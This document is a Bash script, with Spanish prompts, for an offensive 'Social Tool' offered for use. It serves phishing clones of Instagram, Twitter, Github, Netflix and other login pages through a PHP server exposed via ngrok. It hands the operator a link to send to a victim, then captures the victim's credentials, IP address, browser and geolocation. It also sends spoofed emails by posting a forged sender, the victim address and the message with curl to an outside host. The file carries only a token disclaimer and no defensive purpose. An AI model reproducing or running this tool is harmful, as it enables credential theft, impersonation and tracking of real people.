#!/bin/bash
trap 'printf "\n";stop;exit 1' 2

dependencias() {

command -v php > /dev/null 2>&1 || { echo >&2 "Vaya! No encontre php,instalalo y volvemos a intentar."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Vaya!Busqué el wget pero no lo tienes instalado,instalalo y volvemos a intentar."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Vaya! No encontre unzip,instalalo y volvemos a intentar."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Vaya! Necesitamos curl pero no lo tienes,instalalo y volvemos a intentar"; exit 1; }

}
banner() {




echo -e "  _____________________________________________________________________ "
echo -e " |\e[1;32m   ________           _____       ______   ________           ______\e[0m | "
echo -e " |\e[1;32m   __  ___/______________(_)_____ ___  /   ___  __/______________  /\e[0m | "
echo -e " |\e[1;32m   _____ \_  __ \  ___/_  /_  __ \|_  /    __  /  _  __ \  __ \_  / \e[0m | "
echo -e " |\e[1;32m   ____/ // /_/ / /__ _  / / /_/ /_  /     _  /   / /_/ / /_/ /  /  \e[0m | "
echo -e " |\e[1;30m   /____/ \____/\___/ /_/  \__,_/ /_/      /_/    \____/\____//_/   \e[0m | "
echo -e " |_____________________________________________________________________|\n "

printf "\n"           
printf " \e[1;34m No nos hacemos responsables por el mal uso que le puedas dar.\e[0m\n"
printf " \e[1;34m Disfrutalo. \e[0m\n"
printf "\n"
printf "                                  \e[1;37m Hecho por: Error0x00021\e[0m\n"
printf "\n"
printf "\n"             
read -p $'\n\e[1;91m Escribe "S" si aceptas las condiciones de uso...\e[0m\n\n' condi
if [[ $condi == s ]]; then
clear
printf "\n"
printf "\n"
menu1
else 
printf "\n\e[1;91m [!] Error de sintaxis!\e[0m\n\n Vuelve a seleccionar una opción...\n"
printf "\n"
banner

fi
}
#
menu1() {
echo -e "  _____________________________________________________________________ "
echo -e " |\e[1;32m   ________           _____       ______   ________           ______\e[0m | "
echo -e " |\e[1;32m   __  ___/______________(_)_____ ___  /   ___  __/______________  /\e[0m | "
echo -e " |\e[1;32m   _____ \_  __ \  ___/_  /_  __ \|_  /    __  /  _  __ \  __ \_  / \e[0m | "
echo -e " |\e[1;32m   ____/ // /_/ / /__ _  / / /_/ /_  /     _  /   / /_/ / /_/ /  /  \e[0m | "
echo -e " |\e[1;30m   /____/ \____/\___/ /_/  \__,_/ /_/      /_/    \____/\____//_/   \e[0m | "
echo -e " |_____________________________________________________________________|\n "
echo ""
echo -e "\e[1;37m  Este es el menu de Social Tool:\e[0m"
echo "   _______________________________    "
echo "  |                               |    "
echo -e "  |\e[1;91m 1.-\e[0m \e[1;37mPhishing\e[0m                  |       \e[1;37m   versión 0.5\e[0m "
echo -e "  |\e[1;91m 2.-\e[0m \e[1;37mEmail spoofing\e[0m            |    "
echo "  |_______________________________|    "
echo
echo -e "\e[1;33m    ─▄▀▀▀▄────────────────────\e[0m"
echo -e "\e[1;33m    ─█───█────────────────────\e[0m"
echo -e "\e[1;33m    ███████───────────────▄▀▀▄\e[0m"
echo -e "\e[1;33m    ██   ██░░░░░░░░█▀█▀▀▀▀█░░█\e[0m"
echo -e "\e[1;33m    ███▄███░░░░░░░░▀░▀░░░░░▀▀░\e[0m"
echo
read -p $'\e[1;91m Elige una opción...\e[0m\n\n' opcion
if [[ $opcion == 1 ]]; then
echo "elegiste la opción 1: Phishing.."
fishi
elif [[ $opcion == 2 ]]; then
echo "elegiste la opción 2: Email Spoofing.."
spoof
else
printf "\n\e[1;91m [!] Error de sintaxis!\e[0m\n\n Vuelve a seleccionar una opción...\n\n"
menu1
fi
}

fishi() {
echo -e "\e[1;37m       _     _     _               \e[0m"
echo -e "\e[1;37m _ __ | |__ (_)___| |__   ___ _ __ \e[0m"
echo -e "\e[1;37m| '_ \| '_ \| / __| '_ \ / _ | '__|\e[0m"
echo -e "\e[1;37m| |_) | | | | \__ | | | |  __| |   \e[0m"
echo -e "\e[1;30m| .__/|_| |_|_|___|_| |_|\___|_|   \e[0m"
echo -e "\e[1;30m|_|                                \e[0m"
echo -e ""
echo -e "\e[1;37m Este es el apartado de phishing de Social tool, aquí podrás seleccionar\n una opción para poder capturar las credenciales de tu victima:\n\e[0m"
echo -e ""
echo -e "\e[1;91m{\e[0m\e[1;91m01.\e[0m\e[1;91m}\e[0m\e[1;93m Instagram\en   \e[1;91m{\e[0m\e[1;91m06.\e[0m\e[1;91m}\e[0m\e[1;93m Snapchat\en"                   
echo -e "\e[1;91m{\e[0m\e[1;91m02.\e[0m\e[1;91m}\e[0m\e[1;93m Twitter\en     \e[1;91m{\e[0m\e[1;91m07.\e[0m\e[1;91m}\e[0m\e[1;93m Wordpress\en "			                
echo -e "\e[1;91m{\e[0m\e[1;91m03.\e[0m\e[1;91m}\e[0m\e[1;93m Yahoo\en       \e[1;91m{\e[0m\e[1;91m08.\e[0m\e[1;91m}\e[0m\e[1;93m Outlook\en"			
echo -e "\e[1;91m{\e[0m\e[1;91m04.\e[0m\e[1;91m}\e[0m\e[1;93m Github\en      \e[1;91m{\e[0m\e[1;91m09.\e[0m\e[1;91m}\e[0m\e[1;93m Linkedin\en "			
echo -e "\e[1;91m{\e[0m\e[1;91m05.\e[0m\e[1;91m}\e[0m\e[1;93m Spotify\en     \e[1;91m{\e[0m\e[1;91m10.\e[0m\e[1;91m}\e[0m\e[1;93m Netflix\en"
printf "\n"
printf "\n"
echo -e "\e[1;91m{\e[0m\e[1;91m99.\e[0m\e[1;91m}\e[0m\e[1;93m Salir\en"
printf "\n"

read -p $'\n\e[1;92m(\e[0m\e[1;77m✓ \e[0m\e[1;92m).-Elige una opción: \e[0m\en' fish


if [[ $fish == 1 || $fish == 01 ]]; then
server="instagram"
start
elif [[ $fish == 2 || $fish == 02 ]]; then
server="twitter"
start
elif [[ $fish == 3 || $fish == 03 ]]; then
server="yahoo"
start
elif [[ $fish == 4 || $fish == 04 ]]; then
server="github"
start
elif [[ $fish == 5 || $fish == 05 ]]; then
server="spotify"
start
elif [[ $fish == 6 || $fish == 06 ]]; then
server="snapchat"
start
elif [[ $fish == 7 || $fish == 07 ]]; then
server="wordpress"
start
elif [[ $fish == 8 || $fish == 08 ]]; then
server="outlook"
start
elif [[ $fish == 9 || $fish == 09 ]]; then
server="linkedin"
start
elif [[ $fish == 10 ]]; then
server="netflix"
start
elif [[ $fish == 99 ]]; then
printf "\n\e[1;37mHecho por: Error0x00021 \n\nMuchas gracias por usarme.... \e[0m"
exit 1

else
printf "\n\e[1;91m [!] Error de sintaxis!\e[0m\n\n Vuelve a seleccionar una opción...\n\n"
menu
fi
}

spoof() {
clear
echo -e "\e[1;37m __                    __ _             \e[0m"
echo -e "\e[1;37m/ _\_ __   ___   ___  / _(_)_ __   __ _ \e[0m"
echo -e "\e[1;37m\ \| '_ \ / _ \ / _ \| |_| | '_ \ / _' |\e[0m"
echo -e "\e[1;37m_\ \ |_) | (_) | (_) |  _| | | | | (_| |\e[0m"
echo -e "\e[1;30m\__/ .__/ \___/ \___/|_| |_|_| |_|\__, |\e[0m"
echo -e "\e[1;30m   |_|                            |___/ \e[0m"
echo -e ""
echo -e "\e[1;37m Este es el apartado de Email spoofing de Social tool.Aquí podrás enviar \ncorreos de forma anónima, suplantar la identidad de alguien más o hacerte\npasar por un bot de cualquier red social y capturar credenciales.\n\n\n\e[0m"
echo "Escribe la dirección de correo electronico suplantado (remitente):"
echo ""
read remitente
echo "Escribe la dirección de correo electronico victima (receptor):"
echo ""
read receptor
echo "El remitente es: " $remitente
echo ""
echo "El receptor es: " $receptor
echo "" 			 		 
echo "Escribe el asunto del correo:"
echo "" 
read asunto 
echo "Escribe el mensaje para la victima,(puedes obtener plantillas web en la carpeta plantillas)"
echo ""
read mensaje
clear
echo "Su mensaje está siendo enviado...."
echo ""
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:                       (0%)\r'
sleep 1
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:#####                  (27%)\r'
sleep 0.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:#########              (39%)\r'
sleep 0.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:#############          (54%)\r'
sleep 0.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:################       (68%)\r'
sleep 0.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:##################     (89%)\r'
sleep 0.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:####################   (97%)\r'
sleep 0.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:#######################(100%)\r'
sleep 1
curl --data "remitente=$receptor && asunto=$asunto && mensaje=$mensaje && desde=$remitente" http://social-tool-spoofing.000webhostapp.com/bash.php;
clear
echo "Su mensaje ha sido enviado satisfactoriamente a: "$receptor 
echo ""
echo "gracias por usarme."
echo ""
echo -e "\e[1;31m                               _   _ \e[0m"
echo -e "\e[1;31m  _ ____      ___ __   ___  __| | | |\e[0m"
echo -e "\e[1;31m | '_ \ \ /\ / / '_ \ / _ \/ _  | | |\e[0m"
echo -e "\e[1;31m | |_) \ V  V /| | | |  __/ (_| | |_|\e[0m"
echo -e "\e[1;31m | .__/ \_/\_/ |_| |_|\___|\__,_| (_)\e[0m"
echo -e "\e[1;31m |_|                                 \e[0m"
echo ""
sleep 5
clear
banner				
}
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}
 
catch_cred() {
echo -e "\e[1;31m                               _   _ ";
echo -e "\e[1;31m  _ ____      ___ __   ___  __| | | |";
echo -e "\e[1;31m | '_ \ \ /\ / / '_ \ / _ \/ _  | | |";
echo -e "\e[1;31m | |_) \ V  V /| | | |  __/ (_| | |_|";
echo -e "\e[1;31m | .__/ \_/\_/ |_| |_|\___|\__,_| (_)";
echo -e "\e[1;31m |_|                                 ";
echo "";

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Cuenta:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Contraseña:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Las cuentas se almacenan en:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Seguimos esperando cuentas, vamos...\e[0m\n"

}


catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
Nave=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IP de la Victima:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Navegador que usa:\e[0m\e[1;77m %s\e[0m\n" $Nave
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Los datos se almacenan en:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] IP de la victima:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continente != "" ]]; then
printf "\e[1;92m[*] IP de Continente:\e[0m\e[1;77m %s\e[0m\n" $continente
fi
##

Pais=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $Pais != "" ]]; then
printf "\e[1;92m[*] País:\e[0m\e[1;77m %s\e[0m\n" $Pais
fi
##

Estado=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $Estado != "" ]]; then
printf "\e[1;92m[*] Estado:\e[0m\e[1;77m %s\e[0m\n" $Estado
fi
##
Ciudad=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $Ciudad != "" ]]; then
printf "\e[1;92m[*] Ciudad:\e[0m\e[1;77m %s\e[0m\n" $Ciudad
fi
##

ISP=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ISP != "" ]]; then
printf "\e[1;92m[*] Proveedor de internet:\e[0m\e[1;77m %s\e[0m\n" $ISP
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##
Moneda=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $Moneda != "" ]]; then
printf "\e[1;92m[*] Moneda de país:\e[0m\e[1;77m %s\e[0m\n" $Moneda
fi
##
printf "\n"
rm -rf iptracker.log


}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
./ngrok http 3333 > /dev/null 2>&1 &
printf "\e[1;92m[\e[0m*\e[1;92m] Empezamos con el servidor PHP local...\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Empezamos el tuneling al localhost con Ngrok...\n"
echo ""
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:                       (0%)\r'
sleep 1
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:#####                  (28%)\r'
sleep 0.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:#########              (37%)\r'
sleep 1
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:#############          (57%)\r'
sleep 0.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:################       (64%)\r'
sleep 1
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:##################     (87%)\r'
sleep 1.5
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:####################   (91%)\r'
sleep 1
echo -ne '\e[1;92m[\e[0m*\e[1;92m]cargando:#######################(100%)\r\n'
sleep 2
echo -ne "\e[33m[\e[33m✓\e[33m] Listo."
echo ""

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[33m[\e[33m✓\e[33m] Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}


checkfound() {

printf "\n"
printf "\e[1;35m[\e[0m\e[1;35m*\e[0m\e[1;35m] Esperando credenciales de la victima....\e[0m\n"
printf "\e[1;35m[\e[0m\e[1;35m*\e[0m\e[1;35m] La victima aún no ha entrado al phishing...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] Hemos pescado algo!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciales Capturadas!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5


done 

}
banner
dependencias
menu1
